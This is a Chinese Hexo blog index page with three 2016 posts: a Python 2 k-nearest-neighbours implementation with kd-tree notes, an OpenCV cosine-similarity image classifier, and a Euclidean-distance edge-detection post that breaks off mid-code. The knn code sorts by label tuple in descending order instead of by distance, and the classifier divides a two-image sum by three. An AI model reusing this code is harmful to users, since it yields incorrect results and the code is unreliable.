<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
<meta name="generator" content="Hexo 7.2.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/resource/img/fav2024.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/resource/img/fav2024.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/resource/img/fav2024.png">
  <link rel="mask-icon" href="/resource/img/fav2024.png" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"noge.top","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2929408904388376" crossorigin="anonymous"></script><meta property="og:type" content="website">
<meta property="og:title" content="码力欧">
<meta property="og:url" content="https://noge.top/page/9/index.html">
<meta property="og:site_name" content="码力欧">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="nuniok">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://noge.top/page/9/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/9/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>码力欧</title>
  

  <script src="/js/third-party/analytics/baidu-analytics.js"></script>
  <script async src="https://hm.baidu.com/hm.js?9cdc9a11cbd242c6336b07c464d8820c"></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">码力欧</h1>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">瞎折腾</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="home fa-fw"></i>首页</a></li>
        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a></li>
        <li class="menu-item menu-item-future"><a href="/future/" rel="section"><i class="sitemap fa-fw"></i>├ 动态</a></li>
        <li class="menu-item menu-item-nas"><a href="/nas/" rel="section"><i class="sitemap fa-fw"></i>├ NAS</a></li>
        <li class="menu-item menu-item-life"><a href="/life/" rel="section"><i class="sitemap fa-fw"></i>├ 生活</a></li>
        <li class="menu-item menu-item-career"><a href="/career/" rel="section"><i class="sitemap fa-fw"></i>└ 技术</a></li>
        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a></li>
  </ul>
</nav>




</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">nuniok</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">106</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">88</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/nuniok" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;nuniok" rel="noopener" target="_blank"><i class="github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:nuniok@163.com" title="E-Mail → mailto:nuniok@163.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i></a>
      </span>
  </div>



        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="返回顶部">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/12/28/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/12/28/1.html" class="post-title-link" itemprop="url">k近邻法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-12-28 00:00:00" itemprop="dateCreated datePublished" datetime="2016-12-28T00:00:00+00:00">2016-12-28</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>简单解释：采用测量不同特征值之间距离的方法进行分类的算法。<br>主要优点是精度高，缺点是计算和空间负责度高，适用于数值型和标称型。<br>已下是通过Python实现的k-近邻算法，大致思路是计算样本数据<code>data_set</code>中的点与待分类点的距离，按距离递增排序，然后取出前K个点，计算这些点所属标签的数量，计数最高的标签为分类结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /data/server/python/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">k-近邻算法</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> operator</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">knn</span>(<span class="params">position, data_set, labels, k</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    k-近邻算法</span></span><br><span class="line"><span class="string">    :param position: 待分类点</span></span><br><span class="line"><span class="string">    :param data_set: 数据样本</span></span><br><span class="line"><span class="string">    :param labels: 标签集合</span></span><br><span class="line"><span class="string">    :param k: 取值</span></span><br><span class="line"><span class="string">    :return: 所属标签</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    distance_list = []</span><br><span class="line">    <span class="keyword">for</span> index, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(data_set):</span><br><span class="line">        distance_list.append((</span><br><span class="line">            labels[index],</span><br><span class="line">            math.sqrt(reduce(operator.add, [(v - position[i]) ** <span class="number">2</span> <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(item)]))</span><br><span class="line">        ))</span><br><span class="line">    distance_list = <span class="built_in">sorted</span>(distance_list, key=<span class="keyword">lambda</span> x: x, reverse=<span class="literal">True</span>)</span><br><span class="line">    result = Counter([val[<span class="number">0</span>] <span class="keyword">for</span> val <span class="keyword">in</span> distance_list[:k]])</span><br><span class="line">    result_labels = <span class="built_in">sorted</span>(result.items(), <span class="keyword">lambda</span> x, y: cmp(x[<span class="number">1</span>], y[<span class="number">1</span>]), reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> result_labels[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    point = [<span class="number">0.2</span>, <span class="number">0.3</span>]</span><br><span class="line">    data_set = [[<span class="number">1</span>, <span class="number">1.1</span>], [<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0.1</span>]]</span><br><span class="line">    labels = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">    k = <span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span> knn(point, data_set, labels, k)</span><br></pre></td></tr></table></figure>

<h3 id="k-d-tree算法"><a href="#k-d-tree算法" class="headerlink" title="k-d tree算法"></a>k-d tree算法</h3><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/eyeszjwang/articles/2429382.html">http://www.cnblogs.com/eyeszjwang/articles/2429382.html</a></p>
</blockquote>
<hr>
<p><strong>k近邻法</strong> 给定一个训练数据集，对新输入的实例，在训练的数据集中找到与该实例最近邻的k个实例，这k个实例的多数属于某个类，就把该输入实例分为这个类。</p>
<p><strong>kd树</strong> 是一种对k维空间中的实例点进行存储以便对其进行快速检索的树形数据结构。</p>
<h5 id="算法：（构造平衡kd树）"><a href="#算法：（构造平衡kd树）" class="headerlink" title="算法：（构造平衡kd树）"></a>算法：（构造平衡kd树）</h5><p>输入：k维空间数据集<br>$$ T&#x3D;{x_1,x_2,…,x_N} $$,<br>$$ x_i&#x3D;(x_i^{(1)},x_i^{(2)},…,x_i^{(k)})^T, i&#x3D;1,2,…,N; $$</p>
<p>输出：kd树。</p>
<h5 id="生成："><a href="#生成：" class="headerlink" title="生成："></a>生成：</h5><p>从深度为0的结点开始。重复对深度为j的结点，选择<code>x(l)</code>为切分的坐标轴，<code>l=j(mode k) + 1</code>，以该结点的区域中所有实例的<code>x(l)</code>坐标的中位数为切分点，将该结点对应的超矩形区域切分为两个子区域。切分由通过切分点并与坐标轴<code>x(l)</code>垂直的超平面实现。由该结点生成深度为j+1的左、右子结点：左子节点对应坐标<code>x(l)</code>小于切分点的子区域，右子节点对应坐标<code>x(l)</code>大于切分点的子区域。</p>
<h5 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h5><p>对以下给定二维数据集构造一个平衡kd树<br>$$ T&#x3D; {(2,3)^T, (5,4)^T, (9,6)^T, (4,7)^T, (8,1)^T, (7,2)^T } $$</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/12/15/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/12/15/1.html" class="post-title-link" itemprop="url">余弦相似度分类</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-12-15 00:00:00" itemprop="dateCreated datePublished" datetime="2016-12-15T00:00:00+00:00">2016-12-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>计算余弦值公式<br>$$cos\theta &#x3D; \frac{x_1y_1+x_2y_2+…+x_ny_n}{\sqrt{x_1^2+x_2^2+…+x_n^2}\sqrt{y_1^2+y_2^2+…+y_n^2}}$$</p>
<p>样本和待分类图像</p>
<p><img src="/resource/img/9ce24513b3daf2d8.png" alt="样本和待分类图像"></p>
<p>执行结果</p>
<p><img src="/resource/img/e1c67f947d03a7db.png" alt="执行结果"></p>
<p>完整代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author: abc</span></span><br><span class="line"><span class="string">@file: euclidean_distance.py</span></span><br><span class="line"><span class="string">@date: 2016-12-09</span></span><br><span class="line"><span class="string">@desc: 余弦相似度</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">w_fg = <span class="number">20</span></span><br><span class="line">h_fg = <span class="number">15</span></span><br><span class="line">pic_flag = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_pic</span>(<span class="params">fn</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    read_pic</span></span><br><span class="line"><span class="string">    :param fn:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    fnimg = cv2.imread(fn)</span><br><span class="line">    img = cv2.resize(fnimg, (<span class="number">800</span>, <span class="number">600</span>), interpolation=cv2.INTER_AREA)</span><br><span class="line">    w = img.shape[<span class="number">1</span>]</span><br><span class="line">    h = img.shape[<span class="number">0</span>]</span><br><span class="line">    w_interval = w / w_fg</span><br><span class="line">    h_interval = h / h_fg</span><br><span class="line"></span><br><span class="line">    alltz = []</span><br><span class="line">    alltz.append([])</span><br><span class="line">    alltz.append([])</span><br><span class="line">    alltz.append([])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> now_h <span class="keyword">in</span> xrange(<span class="number">0</span>, h, h_interval):</span><br><span class="line">        <span class="keyword">for</span> now_w <span class="keyword">in</span> xrange(<span class="number">0</span>, w, w_interval):</span><br><span class="line">            b = img[now_h:now_h + h_interval, now_w:now_w + w_interval, <span class="number">0</span>]</span><br><span class="line">            g = img[now_h:now_h + h_interval, now_w:now_w + w_interval, <span class="number">1</span>]</span><br><span class="line">            r = img[now_h:now_h + h_interval, now_w:now_w + w_interval, <span class="number">2</span>]</span><br><span class="line">            btz = np.mean(b)</span><br><span class="line">            gtz = np.mean(g)</span><br><span class="line">            rtz = np.mean(r)</span><br><span class="line"></span><br><span class="line">            alltz[<span class="number">0</span>].append(btz)</span><br><span class="line">            alltz[<span class="number">1</span>].append(gtz)</span><br><span class="line">            alltz[<span class="number">2</span>].append(rtz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> alltz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cossimi</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    get_cossimi</span></span><br><span class="line"><span class="string">    :param x:</span></span><br><span class="line"><span class="string">    :param y:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myx = np.array(x)</span><br><span class="line">    myy = np.array(y)</span><br><span class="line">    cos1 = np.<span class="built_in">sum</span>(myx * myy)</span><br><span class="line">    cos21 = np.sqrt(<span class="built_in">sum</span>(myx * myx))</span><br><span class="line">    cos22 = np.sqrt(<span class="built_in">sum</span>(myy * myy))</span><br><span class="line">    <span class="keyword">return</span> cos1 / <span class="built_in">float</span>(cos21 * cos22)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 提取特征</span></span><br><span class="line">    train_x = []</span><br><span class="line">    d = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> xrange(<span class="number">1</span>, pic_flag + <span class="number">1</span>):</span><br><span class="line">        smp_x = []</span><br><span class="line">        b_tz = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        g_tz = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        r_tz = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>])</span><br><span class="line">        mytz = np.zeros((<span class="number">3</span>, w_fg * h_fg))</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">            fn = <span class="string">&#x27;/home/abc/Projects/machine_learning/img/base/p&#x27;</span> + <span class="built_in">str</span>(ii) + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(jj) + <span class="string">&#x27;.jpg&#x27;</span></span><br><span class="line">            <span class="built_in">print</span> fn</span><br><span class="line">            tmptz = read_pic(fn)</span><br><span class="line">            mytz += np.array(tmptz)</span><br><span class="line">        mytz /= <span class="number">3</span></span><br><span class="line">        train_x.append(mytz[<span class="number">0</span>].tolist() + mytz[<span class="number">1</span>].tolist() + mytz[<span class="number">2</span>].tolist())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        fn = <span class="string">&#x27;/home/abc/Projects/machine_learning/img/base/test&#123;&#125;.jpg&#x27;</span>.<span class="built_in">format</span>(index)</span><br><span class="line">        testtz = np.array(read_pic(fn))</span><br><span class="line">        simtz = testtz[<span class="number">0</span>].tolist() + testtz[<span class="number">1</span>].tolist() + testtz[<span class="number">2</span>].tolist()</span><br><span class="line">        maxtz = <span class="number">0</span></span><br><span class="line">        nowi = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(pic_flag):</span><br><span class="line">            nowsim = get_cossimi(train_x[i], simtz)</span><br><span class="line">            <span class="keyword">if</span> nowsim &gt; maxtz:</span><br><span class="line">                maxtz = nowsim</span><br><span class="line">                nowi = i</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;%s属于第%d类&#x27;</span> % (fn, nowi + <span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="http://www.cnblogs.com/chaosimple/archive/2013/06/28/3160839.html">http://www.cnblogs.com/chaosimple/archive/2013/06/28/3160839.html</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://noge.top/2016/12/10/1.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="nuniok">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="码力欧">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2016/12/10/1.html" class="post-title-link" itemprop="url">图像边缘算法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2016-12-10 10:00:01" itemprop="dateCreated datePublished" datetime="2016-12-10T10:00:01+00:00">2016-12-10</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>算法描述：将当前像素与邻接的下边和右边像素进行比较，如果相似设置为白色，否则设置为黑色。</p>
<p>欧氏距离算法，如果两个像素的欧氏距离小于某个常数的阀值则认定为相似。</p>
<p>两个n维向量<code>a(x11, x12, ..., x1n)</code>与<code>b(x21, x22, ..., x2n)</code>间的欧氏距离如下公式：</p>
<p>$$d&#x3D;\sqrt{\sum_{k&#x3D;1}^n(x_{1k}-x_{2k})^2}$$</p>
<p>Python代码实现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_euclidean_distance</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算欧氏距离</span></span><br><span class="line"><span class="string">    :param x:</span></span><br><span class="line"><span class="string">    :param y:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myx = np.array(x)</span><br><span class="line">    myy = np.array(y)</span><br><span class="line">    <span class="keyword">return</span> np.sqrt(np.<span class="built_in">sum</span>((myx - myy) * (myx - myy)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>阀值设置为16</p>
<p><strong>原始图片</strong><br><img src="/resource/img/dd4d3f8b54124d4c.png" alt="原始图片"></p>
<p><strong>描边图片</strong><br><img src="/resource/img/d6e4f48caabdd0da.png" alt="描边图片"></p>
<p><strong>完整代码如下</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@author: abc</span></span><br><span class="line"><span class="string">@file: euclidean_distance.py</span></span><br><span class="line"><span class="string">@date: 2016-12-09</span></span><br><span class="line"><span class="string">@desc: 欧氏距离</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">__author__ = <span class="string">&quot;abc&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_euclidean_distance</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    计算欧氏距离</span></span><br><span class="line"><span class="string">    :param x:</span></span><br><span class="line"><span class="string">    :param y:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    myx = 